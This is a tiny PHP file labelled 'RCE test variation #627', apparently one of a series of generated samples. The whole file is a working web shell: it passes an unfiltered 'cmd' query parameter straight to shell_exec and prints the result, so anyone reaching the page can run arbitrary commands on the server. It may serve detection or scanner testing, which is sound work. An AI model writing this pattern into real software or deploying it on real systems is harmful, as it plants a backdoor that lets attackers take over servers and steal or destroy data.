<?php
// RCE test variation #627
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>